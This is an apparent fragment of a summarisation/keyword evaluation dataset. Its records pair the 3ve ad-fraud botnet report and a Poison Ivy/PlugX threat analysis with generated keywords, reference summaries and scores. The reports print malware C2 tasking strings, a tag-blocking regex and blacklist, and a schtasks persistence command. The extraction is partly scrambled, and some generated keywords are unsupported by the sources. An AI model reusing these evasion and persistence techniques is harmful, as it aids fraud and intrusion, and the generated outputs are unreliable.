IPs3ve.1 BGP hijacked IPs in current vs. ever in useIPsIPsIPsIPsDefunct ASN 3Live ASNDefunct ASN 1IPsIPsDefunct ASN 5Spoofed ConnectionASN BRAVOIPsIPsLive ASNDefunct ASN 2TransitSpoofed ConnectionLater stage structure of 3ve.1\u2019s BGP hijacking operation22Apparently frustrated by blocking, they began using a new technique, just in time for the end of 2017. Instead of relying only on defunct ASs, they started impersonating live, legitimately used ones as well. This works because it is perfectly fine for the same AS to have multiple \u201cpoints of presence\u201d on the Internet as long as it\u2019s only advertising routing for some of its IP addresses at each point. With this change, attempting to identify defunct ASs and block all their IPs would result in collateral blocking. Further, phantom connections to well known transit providers were spoofed to further muddy the waters for automated analysis. They even appeared to be providing transit to some legitimate networks. Despite all the obfuscation, automated identification of this activity is still possible.3ve.23ve.2 used malvertising and social engineering to infect approximately 700,000 Windows computers at any given time \u2014 a truly significant reach for any cybercriminal operation. The actual infection chain has been documented in detail by Kafeine and other Proofpoint staff. It is using social engineering to lure victims into downloading and executing fake Chrome, Firefox, or Flash updates. The 3ve sub-operation removed the need for data center-based browser farms, instead embedding the entire ad fraud component into malware executed by its victims\u2019 infected computers. This approach greatly simplified the botnet\u2019s data center operation by pushing complexity into the malware. 3ve.2 is responsible for the majority of 3ve\u2019s total outbound network traffic.Counterfeit websites3ve.2\u2019s main component was its browsing module, which was responsible for browsing counterfeit websites and subsequently executing the ad fraud activity. These sites, hosted on servers in data centers, are templated sites that mainly contain an ad space and its supporting ad libraries along with some scraped content from legitimate websites. To execute the ad fraud, 3ve.2 instructed its browser-bot army to visit these counterfeit sites, loading them in programmatically-driven browsers to generate artificial ad impressions. The ad fraud component was based on the Chrome Embedded Framework (CEF), which the botnet\u2019s authors heavily customized to better mimic a typical Chrome instance. 3ve.2 hijacked domain name resolution (DNS) requests originating from the CEF, instructing the bot on the victim\u2019s machine to visit 3ve-controlled counterfeit websites instead of the original domains. Hijacking DNS resolution for the CEF process keeps 3ve\u2019s victims unaware of the malware on their computers. Since the DNS hijacking was isolated to the CEF requests the user\u2019s regular browsing activity remained unaffected.We were able to identify three different sources of counterfeit websites (referenced as templates) that 3ve.2 visited. We believe 3ve.2 was able to monetize capacity by counterfeiting benign websites. Below are screenshots and JavaScript code snippets used to render the ads on each of those templates.233ve.2 Template AThe top screenshot below shows an anonymized example of an original website while the bottom screenshot is the counterfeit equivalent for the same domain. The counterfeit page only includes a video ad and a few links below it.Original websiteCounterfeit website\u2022 Watch More Funny Movies on FilmPhile \u2022 Watch Live TV on FilmPhile \u2022 Closed Captioning \u2022 American Sis - Sibling Rivalry - FilmPhile \u2022 Watch This Season\u2019s Comedy on FilmPhile \u2022 Here\u2019s What Happened on American Sis - The Secret Society of Super Sisters - FilmPhile \u2022 Turned - All Is Not Gone - FIlmPhile \u2022 CD League - Semifinals/Grand Final - FilmPhile \u2022 Search \u2022 Help243ve.2 Template BThis HTML template is arbitrarily defining the size of the player based on the current time.<div id=\u201cad_content\u201d> <div id=\u201cjw7113\u201d></div> <div id=\u201cbanners\u201d> <script src=\u201cXXX\u201d></script> <script language=\u201cjavascript1.1\u201d src=\u201cXXX\u201d></script> </div>[1025,575], ];2 var resolutions = [ 9 var date = new Date(); 10 var item = date.getMinutes() % 5; 11 var width = resolutions[item][0]; 12 var height = resolutions[item][1]; 21 <script type=\u201ctext/javascript\u201d> 22 var playerInstance = jwplayer(\u2018jw7113\u2019); 23 playerInstance.setup({ 24 file: \u2018/movies.mp4\u2019, 25 width: width, 26 height: height, 27 autostart: true, 28 primary: \u2018flash\u2019, 29 repeat: true, 30 controls:false, 31 advertising: { 32 client: \u2018vast\u2019, 33 tag: \u2018XXX=\u2019+width+height 34 } 35 });3ve.2 Template B code snippet253ve.2 Template CThis template randomly decides where to place a video ad on the page by extracting arbitrary X, Y coordinates from the page URL.while(checksum>50){ checksum=checksum-50; } return checksum+10;if(t==2){while(checksum>80){ checksum=checksum-80; } return checksum+10;checksum += (s.charCodeAt(index) * (index + 1)+t);var index; if(t==1){var checksum = 12345678;} if(t==2){var checksum = 00000000;s=s+s;} for (index = 0; index < s.length; index++) { if(t==1){1 function xy_checksum(s,t){ 21 function place_player(pl){ 22 pl.style.position = \u2018absolute\u2019; 23 pl.style.left=xy_checksum(window.top.location.href,1)+\u2019%\u2019; 24 pl.style.top=xy_checksum(window.top.location.href,2)+\u2019%\u2019; 29 } catch(e) 32 }ads_placer_work.add_ad_element(document. getElementById(\u2018mainvd\u2019),\u201dvideo\u201d,\u201d576x344\u201d);place_player(document.getElementById(\u2018mainvd\u2019));3ve.2 Template C code snippet26Hidden Windows3ve.2 used hidden windows on a hidden desktop to conceal its activity on an infected user\u2019s machine. It\u2019s common for malware that needs to hide a window to use either hidden windows or a hidden desktop, but rarely both. The hidden desktop was discovered while analyzing a memory dump.This added a further level of obfuscation because Windows 7 does not support multiple desktops. The exception to this type of setup is through the use of the Windows API. The legitimate use for this feature is creating a new desktop for another user who wants to log in. We observed that when the malware created the new desktop, it didn\u2019t create a new instance of explorer.exe. This meant that an analyst wouldn\u2019t be able to easily access their tools, because there wouldn\u2019t be a way to create processes on this desktop due to the absence of a running instance of Explorer.Fake Browsing BehaviorTo avoid detection, 3ve.2 exhibited a human-like behavior through mouse movements and clicks, occasionally blocked verification libraries (by leveraging two separate techniques), while also generating false, but seemingly organic, data.Mouse movementsWe\u2019ve seen 3ve.2 scroll around the screen or move the mouse in a simplified \u201chuman\u201d manner.Examples of mouse movements from 3ve.227Patching functionsThe malware also patched some functions that are usually implemented in native code. For example, it spoofed various items related to the environment such as the AudioContext values (see code used for AudioContext spoofing below). It also used JavaScript to find links on the page on which to click. These snippets of code were used to override the browser\u2019s built in functionality, so that the C2 could control what the browser reports to the site. So instead of running a native code function from the JavaScript engine, the malware\u2019s patched version is executed to let the bot look more organic.JavaScript code that patched properties such as maxChannelCount in the browser28Playing mediaThe malware contained an interesting code snippet, a few lines of JavaScript, that was used to play media on a page. The malware authors included a few try catch statements which loop through all of the elements on a page named either \u2018embed\u2019, \u2018object\u2019, or \u2018video\u2019 and then tried to call play(), playVideo(), or start() on them. It did so to try to maximize the payout for each site visit by attempting to play the respective video ads.JavaScript to automatically play video ads29Tag evasion3ve.2 used a regular expression matching technique for blocking unwanted assets on a page. This was done through a variable in the C2\u2019s response named bbb_l_m (more details below). When a website was loaded, the malware looped through every URL in the site and passed each of them to a function that checked the URL against a regex to determine whether a resource should be blocked or allowed. For example, this technique was used to block the White Ops JavaScript tag.Function\u2019s assembly to determine whether a resource should be blocked or allowedIf the URL matched the regular expression, the function would return 1, and the URL being operated upon would be replaced with the string \u201cnone,\u201d thereby blocking the resource from ever being downloaded or executed. Otherwise, If the URL didn\u2019t match, the function returned 0 and the resource was not blocked.Another method of evasion that 3ve.2 used was a string blacklist based on the components of a resource found in the bbb_j_m C2 variable. If any of these strings were identified within a resource (e.g., JavaScript or HTML), the respective resource on the website 3ve.2 visited wouldn\u2019t get rendered or executed. For example, bbb_j_m contained strings from the White Ops JavaScript tag, and strings related to crypto-jacking such as cryptonight, CoinHive, CryptonightWASMWrapper, and abortOnCannotGrowMemory. 3ve.2 prevented crypto-jacking scripts from executing because they might lead to inadvertent detection of the malware.if a user noticed noticed their computer was running slower, hotter or noisier (due to fans spinning up) than normal due to the cryptocurrency mining running in the background.Non-counterfeit domains browsingFinally, in addition to visiting counterfeit websites, 3ve.2 instructed residential bots to visit legitimate domains. This was likely done to participate in traffic-selling schemes, and to better blend in with organic traffic by gathering cookies from legitimate websites.C2 instructions3ve.2\u2019s ad-fraud module requested new tasks from the command & control servers every few minutes. The following request sent from the bot to the servers provides details about the infected machine\u2019s state. For example, it includes a unique bot id, a bot version, language, operating system version.mode=3&UID= &clicks=3&uknerr=0&referr=0&hproc=0&fcproc=0&fproc=0&fthr1=0&fthr2=0 US&chrome=1&w_cont=7&cont_err=1&lastcie= &os_number=6.1&fd=3ve.2\u2019s ad fraud task request (decrypted and anonymized; obtained via API hooking)30The C2 replies with a list of tasks to perform in the next time slot. Each of these tasks instructs 3ve.2\u2019s embedded browser to visit a given URL with a custom environment, which e.g. includes a fake user agent, screen resolution, plugins, and a regular expression of JavaScript sources to prevent from loading (mainly for blocking verification code and browser-based crypto mining).RESP:OK|url|<>|url|<>|0:00:00:00:00:00:00:00:00: 00::||scrl_cfg:000000-00000-68:scrl_cfg|fcs_cfg:3000-2194:fcs_cfg||p_hhw:100:p_hhw|w_w_ perc:5:w_w_perc|scrtype:2:scrtype|setcpu:1:setcpu|veryfast:93:veryfast|lowl_c:0:lowl _ c | m i n m s : 4 4 : m i n m s | h s t _ c o u n t : 4 : h s t _ c o u n t | c h e c k j s c m d : 1 : c h e c k _ j s c m d | d o m s _ spoof:coinhive.com>0||coin-hive.com>0||jsecoin.com>0||reasedoper.pw>0||mataharirama. xyz>0||listat.biz>0||lmodr.biz>0||minecrunch.co>0||minemytraffic.com>0||crypto-loot.com >0||2giga.link>0||ppoi.org>0||coinerra.com>0||coin-have.com>0||kisshentai.net>0|| miner.pr0gramm.com>0||kiwifarms.net>0||anime.reactor.cc>0||joyreactor.cc>0|| kissdoujin.com>0||minero.pw>0||coinnebula.com>0||afminer.com>0||coinblind.com>0|| w e b m i n e . c z > 0 | | m o n e r o m i n e r . r o c k s > 0 | | c d n . c l o u d c o i n s . c o > 0 | | c o i n l a b . b i z > 0 | | papoto.com>0||edgeno.de>0||jyhfuqoh.info>0||ads-miner.appspot.com>0||www.hashing. win>0||:doms_spoof||bbb_l_m:^http[^\\?&]{1,128}/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588{\u2588\u2588}/(\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588).js|| :bbb_l_ m| bbb_j_m:cryptonight||CryptonightWASMWrapper||CoinHive||\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 ||\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588||:bbb_j_m||force_use_cont_id::44::force_use_cont_id|hos crm:6.1:hos_ crm|hfont_crm:Arial Greek.Arial Cyr.Leelawadee UI Semilight:hfont_crm|flash_p:plugins\\ |setua:Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0. 3239.84 Safari/537.36:setua|scr_data:1920x1080-1920x1040-1-5-0-1.50:scr_data|spf_c_dta:9 :spf_c_dta|spf_s_dt:119:2:0.01:48000:spf_s_dt|srtds:,@d:1:0,c:2:1,g:3:0,g:4:2, g:5:3,@,#00000000000000000000:srtds|spf_r_dt:83.72.1:spf_r_dt|spf_cc_dt: 4:spf_cc_dt|gl_dat:packe[ ]==:gl_dat|jsshh:553000000:jsshh|mrysf:2.0:mrysf|sltd: 4447:sltd|sbyd:0:sbyd||hook_l_mpg:1:hook_l_mpg|enable_ex_2:1:enable_ex_2|dsth:1:dsth||<>3ve.2 tasking the embedded browser to visit a legitimate URL (plaintext extracted via API hooking; the real domainhas been replaced with \u201cexample.com\u201d). White Ops code is blocked (details have been redacted).As we described before, 3ve.2 would intermix browsing legitimate websites with counterfeit ones. 3ve.2 instructed the embedded browser to visit a redirector URL, which would issue an HTTP 302 toward the home page of the spoofed site, passing its IP address as a parameter. The embedded browser would update its DNS records to match the given IP with the spoofed site, which it would then visit. The spoofed site then either directly served the ad fraud payload in the response or would 302 redirect the browser again to the final ad fraud URL, which is a URL that existed on the legitimate version of the site. For spoofed news sources, this final ad fraud URL was usually the URL of a news article.31Infected computerKovter C21. Client pings serverwhich replies with ad-fraud configCounterfeit website 3. Counterfeit website sends 302 redirect toad-fraud URLRedirection server 2. 302 redirect to counterfeit websiteDiagram: How 3ve.2 operates4. Ad-fraud URL leads to counterfeit pagewith video ad.{}/(.com&land_ip=&group= &subid=&uid=. .com/|<>|0:00:00:00:00:00:00:00:00:00::|od_od:& t y p e = v s p o o f _ R E S P : O K | h t t p : / / 1 8 8 . 2 1 4 . 3 0 . 9 2 / a p i / g e t l i n k s . p h p ? c l i c k = :fcs_cfg||p_hhw:100:p_hhw|w_w_perc:5:w_w_perc|scrtype:0:scrtype|setcpu:1setcpu|ver yfast:107:veryfast|lowl_c:0:1owl_c|minms:27:minms|hst_count:18:hst_count|check_jscm d:1:check_jscmd|doms_spoof:coinhive.com>0||coin-hive.com>0||jescoin.com>0||reasedop er.pw>0||matahariama.xyz>0||miner.pr0gramm.com>0||kiwifarms.net>0||anime.reactor.cc>0|| fic.com>0||crypto-loot.com>0||2giga.link>0||ppoi.org>0||coinerra.com>0||coin-have.c om>0||kisshentai.net>0||miner.pr0gramm.com>0||kiwifarms.net>0||anime.reactor.cc>0|| joyreactor.cc>0||kissdoujin.com>0||minero.pw>0||coinnebula.com>0||afminer.com>0||co inblind.com>0||webmine.cz>0||monerminer.rocks>0||cdn.cloudcoins.co>0||coinlab.biz> 0||papoto.com>0||edgeno.de>0||jhynfuqoh.info>0||ads-miner.appspot.com>0||www.hashing .win>0||:doms_spoof||bbb_1_m:^http[^\\?&]{1,128]/ cont_id::63::force_use_cont_id|hos_crm:10.0:hos_crm|hfont_crm:CambriaMath.Stika Display.Sitka Display:hfont_crm|flash_p:plugins\\pepflashplayer32_23_0_0_126.dll:flash_p|flash_v:2 8.0.0126:flash_v|enable_ex_5:1:enable_ex_5|setua:Mozilla/5.0 (Windows NT10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.40 Safari/537.36:setua|scr_data:1600x900-1600x860-1-5-0-1.00:scr_data|spf_c_dta:12:spf _c_dta|spf_s_dt:73:2:0.0000000000000.00000:spf_s_dt|srtds:,@d:1:0,c:2:1,g:3:0,@,#00 0000000000000000000000:srtds|spf_r_dt:28.50.0:spf_r_dt|spf_cc_dt:2:spf_cc_dt|gt_dat: pack[ ]:gl_dat|jsshh:747000000:jsshh|mrysf:2.0:mrysf|sltd:-51416:sltd|sbyd:0:sby d||hook_1_mpg:1:hook_1_mpg|enable_ex_2:1:enable_ex_2|dsth||<>).js||:bbb_1_m||bbb_j_m:cryptonight||CrytonightWASMWrapper||CoinHive||3ve.2 tasking the embedded browser to visit a spoofed site (plaintext extracted via API hooking)32Additionally, 3ve.2\u2019s ad fraud module would periodically send updates about the host\u2019s available resources and mode=1&UID= gmt=GMT -08:00& threads =1&online = f&exet=ffile&fcl=no&totalram=1023&loadram=191&freeram=465&cpuload=8&selfcpu=7&th rdscpu=0&ccpu=1&isafk=no&te=0&antivirus=-&firewall=-&antispyware=Windows Defender::&cont_err =1&chrome =1&f d=3ve.2\u2019s status update (plaintext extracted via API hooking)Parameters explainedod_od: This parameter defines the domain to spoof. Spoofing is done by passing a domain name as the host header to an IP address unrelated to the domain.fd_fd: IP address to browse to.setcpu: A value used to patch the JavaScript environment. Specifically patched window.navigator.hardwareConcurrency value which returns the number of logical cores in the system. Has been observed to be set to 1, 2, or 4.scrl_cfg: Appears to be a \u201cscroll config\u201d however we have not determined exactly what the value will control.doms_spoof: This value is a long list of domain names delimited by >0|| which is not used in fraud operations. It is meant to throw off an analyst by making them think it\u2019s being used for cryptojacking or by wasting their time if they choose to dive into this domain list.bbb_l_m: This is a regular expression used to block unwanted resources from being downloaded on a site. This value has been a static value during our analysis and will match the White Ops client tag format. This means that the vast majority of White Ops JS tags will be blocked before the HTTP GET is ever requested to our tag.bbb_j_m: This is a list of blacklisted strings. Any file containing these strings will not be executed or rendered.scr_data: Screen data (1366x768-1366x728-1-5-0-1.00) where 1366x768 is the spoofed resolution of the screen, 1366x728 is the real resolution of the window, and 1.00 is the scale factor.setua: It contains the User-Agent string to use in the browsing session.spf_s_dt: This most likely stands for spoof sound data. An example of this would be 184:2:0.01:48000 where 2 is the channel count and 48000 is the sample rate.c_dir: Points to a cache directory within the browsers folder. Each browsing session appears to get a new cache directory.33Geographic distribution3ve.2\u2019s operators took great care in trying to prevent ad networks from noticing their illicit activity. This is why, for example, 3ve.2 malware only fully executed in countries where organic Internet users are likely to be browsing the same premium sites 3ve is counterfeiting, including the US, Canada, and the UK. 3ve\u2019s victim population is shown in the figure below.Heat map of the residential computers infected with 3ve.2 botnet around the world\u2014red indicating the highest concentration of computers, green the lowest34Infected IPs and churn rate3ve.2 Infected IPs and churn800,000600,000400,000200,000050%40%30%20%10%02/4/20182/11/20182/18/20182/25/2018Infected IPs% IPs churned (since beginning of month)Number of IPs infected with the malware used by 3ve.23ve.2 had roughly 700,000 infections at any given point in time that were actively generating ad fraud. These IPs would frequently change due to ISPs IP rotation (natural churn), new infections, and clean-ups. As a result, a third of those IPs would be replaced by new ones every 4 weeks.3ve.3The final 3ve-associated sub-operation was the least sophisticated of the three in terms of the approach it used for IP exit nodes. 3ve.3 used other data centers as proxies instead of residential computers, tunnelling fraudulent traffic out of anywhere between 15,000 and 20,000 IP addresses. Using data centers instead of computers made 3ve.3\u2019s bot traffic more likely to be detected, but their strategy still offered its operators a good degree of agility by allowing them to find new data centers quickly when previously used data centers were blocked. We\u2019ve found that this sub-operation\u2019s architecture is similar to that of 3ve.1. The sub-operation was focused on a range of ad fraud approaches, including video, display, and click fraud.Despite its lack of sophistication relative to other 3ve sub-operations, 3ve.3 still had a fairly complex backend, relying on rogue DNS servers that rendered the content pages and resolved legitimate domains to the IP address of counterfeit, 3ve-controlled sites. Additionally, 3ve.3 used sophisticated evasion techniques like tag evasion, similar to both 3ve.1 and 3ve.2. However, 3ve.3\u2019s key difference from the other sub-operations is in its exit node layer, which relied somewhat rudimentarily on data centers rather than residential computers. While this enabled them to look like tens of thousands of users viewing ads, it also made them far easier to detect.35 ", "generated_text": "the document; ad fraud; 3ve; the last year; the research; the organization; ad fraud; 1 million IPs; ad space; the operation; over 10 years; the operations; hundreds; agents; government; companies; tactics; sub-operations; botnets; a network; a proxy; users; network communication; USB; over 1 million IPs; home; Europe; the botnets; a network; thousands; servers; thousands; ad servers; the network; techniques; malware; the botnets; historical attacks; The operation; the broader media; ad fraud; collaboration; detection; future attacks; the digital advertising industry; defense; prevention; compromise; the threat actor; positive results.", "ref_text": "<START-1>The document describes an investigation by Google and White Ops into a major online ad fraud operation called \"3ve\" that was taken down through industry collaboration. - 3ve was composed of three sophisticated botnets that each used different techniques to commit ad fraud at a massive scale, generating billions of fraudulent ad bid requests. - The botnets infected over 1 million IPs from residential computers and corporate networks to proxy their activities. They created over 10,000 counterfeit websites mimicking legitimate publishers to sell fake ad inventory. - 3ve.1 used malware infections and BGP hijacking to acquire proxy IPs. 3ve.2 infected 700,000 computers via malvertising to power a custom browsing botnet. 3ve.3 used IP addresses from data centers. - The botnets used advanced techniques to mimic human behavior and evade detection like fake mouse movements, randomized behaviors, anti-forensics scans, and blockchain mining scripts. - Google, White Ops and other security firms analyzed the operation and formed an industry working group. They observed the operators, mapped the infrastructure, and coordinated a takedown. - The takedown involved referral to law enforcement, infrastructure disruption, botnet sinkholing, and cooperation across ad tech, security firms, ISPs and hosting providers. It successfully rendered the 3ve botnets inactive. - The collaboration and actions taken aim to set a precedent to deter future large-scale ad fraud operations by imposing real consequences on the perpetrators. Continued industry cooperation is needed to protect the digital ad ecosystem. <END-1>", "t5/keyword/hint_hit_precision": 0.2, "t5/word/hint_hit_recall": 0.07203389830508475, "gpt3/lexical/rouge_rouge1": 0.40896358543417366, "gpt3/lexical/rouge_rouge2": 0.1295774647887324, "gpt3/lexical/rouge_rougeL": 0.2072829131652661, "gpt3/lexical/rouge_rougeLsum": 0.2072829131652661, "gpt3_generated_text": ["In the past year, a major ad fraud operation known as 3ve, involving over 1 million IPs and sophisticated tactics, was investigated by a collaborative effort between Google, White Ops, Proofpoint, and other industry partners. The operation controlled a network of botnets and servers, generating billions of fraudulent ad bid requests. The investigation led to the identification and disruption of 3ve's infrastructure, resulting in criminal charges by the U.S. Department of Justice and the disabling of the operation's botnets. This successful takedown demonstrates the effectiveness of industry collaboration in combating ad fraud and protecting the digital advertising economy. Going forward, efforts to detect, prevent, and defend against future attacks will continue to be a priority for the industry."]}, {"split_name": "val", "sample_id": "val_35", "prompt_text": "Extract the keywords: 2015/10/30Threat Analysis: Poison Ivy and Links to an Extended PlugX Campaign \u2013 CYINT Analysisin AnalysisThreat Analysis: Poison Ivy and Links to an Extended PlugX CampaignKey Points & Assessment:Japan CERT identified a new Poison Ivy RAT variant with updated C2 functionality. The malware was created in September 2014 and uploaded to Virus Total in January 2015. It uses the dynamic DNS-provided C2 getstrings[.]jumpingcrab[.]com. This domain has I identified several decoy documents (see Maltego graph) that deliver the PlugX malware and call-out to one of two IP addresses mentioned above. These documents were reportedly used in a campaign identified by SOPHOS that spanned from September 2014 to February 2015. India was one target of the campaign. Given the infrastructure and timing overlaps, the Poison Ivy sample discussed in this post was likely just one payload involved in a broader campaign targeting India, the Tibetan community, and others, that spanned from approximately September 2014 to February 2015. The Poison Ivy sample in this case thus appears to be tied tourl Analysis: Poison Ivy and Links to an Extended PlugX Campaign \u2013 CYINT Analysis attacks by one or more adversaries acting on behalf of Chinese interests.Poison Ivy: New C2 Proxy FunctionalityPoison Ivy (PIVY) is a well-known, fully-featured remote access tool (RAT) that has existed since about 2005. It offers a user-friendly GUI, a variety of plugins to enhance functionality, and can be found online by any prospective attacker.And, although anyone can acquire the tool, PIVY is often associated with actors who have a nexus to China.url Analysis: Poison Ivy and Links to an Extended PlugX Campaign \u2013 CYINT AnalysisThe malware has been extensively documented\u2013including its use in espionage-motivated intrusions\u2013and continues to show signs of active development [1]. A recent blog post from Japan CERT (JPCERT) details new Poison Ivy communications functionality. According to JPCERT, the malware now uses HTTP POST requests (earlier variants use a custom HTTP CONNECT request method) and supports proxy authentication to command-and-control (C2) servers.Because JPCERT has already tackled this variant\u2019s communications functionality, I will examine other aspects of the malware.File & Execution DetailsUnfortunately, we do not know the delivery vector or target. The intended target may have been one or more Japanese organizations, given that JPCERT was the first to dissect this PIVY sample. Alternatively, it is just as likely that JPCERT simply observed attacks against other victims.File Name: vscrtapp.exe File size 67.0 KB (68608 bytes) Compilation timestamp 2014-09-14 01:30:49 First submission 2015-01-19 11:03:27 UTC ( 6 months, 1 week ago )The sample will write the file vscrta0ps.log to C:\\Documents and Settings\\All Users\\AppData\\. There appear to be no legitimate applications that would write this file to disk.C:\\Documents and Settings\\All Users\\AppData\\vscrta0ps.logIt will also run the below command:schtasks /create /sc minute /mo 1 /tn Update Assist\" /tr \"\\\"C:\\Do cuments and Settings\\All Users\\AppData\\vscrtapp.exe\\\"\" /ru \"system \"\"This command will create a scheduled task named \u201cUpdate Assist.\u201d I assume this is a non-English speaker\u2019s attempt to create an \u201cUpdate Assistant\u201d task name. This task will run the malware every minute on the victim\u2019s machine as vscrtapp.exe in the %AppData% directory. The task therefore serves as a basic method of persistence, ensuring that the malware runs regularly. I found no indications that the malware creates any registry keys; the scheduled task appears to be the malware\u2019s only means of persistence.It is not clear what, if any, legitimate EXE vscrtapp.exe is attempting to mimic. One possibility may be NetApp\u2019s Virtual Storage Console (VSC) for VMWare (note that the below image is not the query I ran; I simply wanted to show the similarity between the names). Although developers of PIVY could easily change the name, the presence of the vscrtapp.exe filename could serve as a simple host-based method of detection.url Analysis: Poison Ivy and Links to an Extended PlugX Campaign \u2013 CYINT AnalysisThe malware will set a mutex (it imports the function CreateMutexA), although I was unable to determine the value.PIVY InfrastructureC2 communications will be made to getstrings[.]jumpingcrab[.]com using HTTP POST requests. It is important to note that the domain jumpingcrab[.]com is a dynamic DNS (DDNS) service. While not inherently malicious, DDNS providers are often abused by threat actors so they do not have to rely on static infrastructure; IP resolution for a host could change at any time.Analysis of an attacker\u2019s infrastructure is thus made more difficult. The use of DDNS also means that the relevancy and reliability of any infrastructure pivots must be carefully considered.Taking the use of DDNS into consideration, here are current and historical resolutions for getstrings[.]jumpingcrab[.]com (courtesy of PassiveTotal):Resolve Location Network First Last 47:31url Analysis: Poison Ivy and Links to an Extended PlugX Campaign \u2013 CYINT Analysis47:31 29:15 directly correlates with the first submission time of the sample. The Passive Total heat map (shown below) tells us there were almost no active resolutions for this host from February until late July suggesting that the adversary may have observed the submission and deactivated DNS for the host on or around January 19. (Unfortunately, the 12 day gap between January 19 and the beginning of February is an additional hosts (which also use DDNS domains):www.yahoo.4pu.com www.google.zzux.com www.winupdate.ddns.ms freemoney.ignorelist.com www.micrsoft.ddns.ms office.onmypc.org www.office.onmypc.org abcdollar.mooo.comBoth winupdate[.]ddns[.]ms and www[.]micrsoft[.]ddns[.]ms are undoubtedly attempting to resemble legitimate Windows and Microsoft sites, respectively. However, it is unknown if any of theseurl Analysis: Poison Ivy and Links to an Extended PlugX Campaign \u2013 CYINT Analysishosts are related to the actors who created getstrings[.]jumpingcrab[.]com.Related Threat ActivityThere are several documents that appear to target victims interested in Chinese affairs, attempt to install the PlugX malware (aka Korplug, SOGU), and communicate to two of the above identified IP addresses RAT commonly linked to Chinese threat actors.Below are the documents and their relevant metadata (some details were not available).CHINA NEWS BRIEF 09 of 2015.doc Create Time/Date: Wed Sep 3 02:25:00 2014 First submission 2015-01-30 04:44:34 UTC ( 6 months, 1 week ago ) Create Time/Date: Fri Jan 30 02:41:00 2015 First submission 2015-02-01 09:49:08 UTC ( 6 months, 1 week ago ) Title: Suggested Invitees for Ambassador Create Time/Date: Mon Jul 19 07:59:00 2010 and Draft contract CMS Trg System.doc) exploit CVE-2012-0158 to install PlugX (aka Korplug/SOGU), which then calls pointed to in January. The \u201cChina News Brief\u201d document is shown below.I have not yet concluded what the contents of SHA1 document contact list.doc (shown below) also installs PlugX identified in a June 2105 Citizen Lab post about attacks on the Tibetan diaspora in Hong Kong. (I hope to explore this connection in greater details in a follow-on post.)url Analysis: Poison Ivy and Links to an Extended PlugX Campaign \u2013 CYINT AnalysisInterestingly, both CHINA NEWS BRIEF 09 of 2015.doc and Draft contract CMS Trg System.doc are mentioned in a February 2015 SOPHOS report. The report discusses PlugX attacks on a variety of targets including those on India. The attacks reportedly took place between September 2014 and February 2015. Our PIVY sample was compiled on September 14, 2014 and submitted to Virus Total on January 19, 2015.In addition to the infrastructure overlap, this correlation in timing also suggests that the Poison Ivy sample was just one payload involved in a much broader, 5-6 month campaign targeting India, the Tibetan community, and likely others of interest to China.According to the SOPHOS report:Not surprisingly, just like with several other campaigns, in this case it was observed that different malware families were distributed using similar carrier documents\u037e only the encrypted payload was replaced at the end of the file. The shellcode used in the carrier was very convenient for this purpose: the length and location of the final payload was stored at the end of the file. It was possible to swap the payload without needing to modify the exploit condition and the shellcode itself.url Analysis: Poison Ivy and Links to an Extended PlugX Campaign \u2013 CYINT AnalysisThus, our Poison Ivy sample in this case appears to be tied to extensive attacks by one or more adversaries acting on behalf of Chinese interests.[1] For example, by FireEye, Conix Security, and Trend Micro.\uf300 Tell me what you think!RELATED CONTENT BY TAGANALYSISCHINAMALWAREPLUGXPOISONIVYIndependent Publisher empowered by WordPressurl ", "generated_text": "The malware; PowerShell; Poison Ivy; PIVY; 2005; a user-friendly GUI; DNS; HTTP POST requests; Proxy authentication; server; part; China; India; Tibet; the attackers; the RAT; a scheduled task; Update Assistant; persistence; a scheduled task; persistence; the current version; the command; Control; the execution process; Decryption; the binary; the XOR.exe file; the command execution time; a time; the language; a campaign; Indian; Tibet; the identity; the IP address; the IP address; CYINT; the exploits; analysis; the DLL; The malware.", "ref_text": "<START-1>The report by CYINT Analysis examines a new variant of the Poison Ivy remote access trojan (RAT) identified by Japan CERT in September 2014. The Poison Ivy sample uses updated command and control capabilities and the domain getstrings[.]jumpingcrab[.]com, which has resolved to 3 different IP addresses. The report connects this Poison Ivy variant to an extended campaign from September 2014 - February 2015 that distributed PlugX malware using decoy documents targeting India, Tibetan communities, and other parties of interest to China. Some of the decoy documents use the same IP addresses as the Poison Ivy sample. A Sophos report on PlugX mentions attacks on India over the same September 2014 - February 2015 timeframe. The timing and infrastructure overlaps suggest the Poison Ivy sample was part of a broader 5-6 month campaign likely conducted by one or more Chinese state-sponsored groups. The report concludes that while anyone can acquire Poison Ivy, this particular variant appears tied to cyber espionage activity aligned with Chinese intelligence priorities, given the targeting, timing, infrastructure, and connections to PlugX. <END-1>", "t5/keyword/hint_hit_precision": 0.19047619047619047, "t5/word/hint_hit_recall": 0.05172413793103448, "gpt3/lexical/rouge_rouge1": 0.49577464788732395, "gpt3/lexical/rouge_rouge2": 0.1586402266288952, "gpt3/lexical/rouge_rougeL": 0.27042253521126763, "gpt3/lexical/rouge_rougeLsum": 0.27042253521126763, "gpt3_generated_text": ["This article discusses a new variant of the Poison Ivy remote access tool (RAT) which was created in September 2014 and uploaded to Virus Total in January 2015. The malware uses a dynamic DNS-provided C2 and new proxy functionality for communications with command-and-control servers. The article also mentions a campaign identified by SOPHOS targeting India, Tibet, and others, which used decoy documents to deliver the PlugX malware. The Poison Ivy sample discussed in the article is likely part of this broader campaign. The malware creates a scheduled task named \"Update Assist\" for persistence, running every minute on the victim's machine. The article provides file and execution details of the malware, including the creation of a vscrta0ps.log file and the execution of vscrtapp.exe. Additionally, the article highlights the ties of Poison Ivy to Chinese actors and the active development of the malware since 2005. Overall, the analysis suggests that the current version of Poison Ivy is linked to attacks by adversaries acting on behalf of Chinese interests, targeting India, Tibet, and potentially other regions."]}, {"split_name": "val", "sample_id": "val_36", "prompt_text": "Extract the keywords: ti.qianxin.com /blog/articles/Kasablanka-Group-Probably-Conducted-Compaigns-Targeting-Russia/ Kasablanka Group Probably Conducted Compaigns Targeting RussiaOverviewAPT groups often use some uncommon file types to host malicious code in order to increase the probability of immunity against antivirus software, such as CD-ROM image files (.iso) and virtual hard disk files (.vhd), which we have monitored for abuse in recent 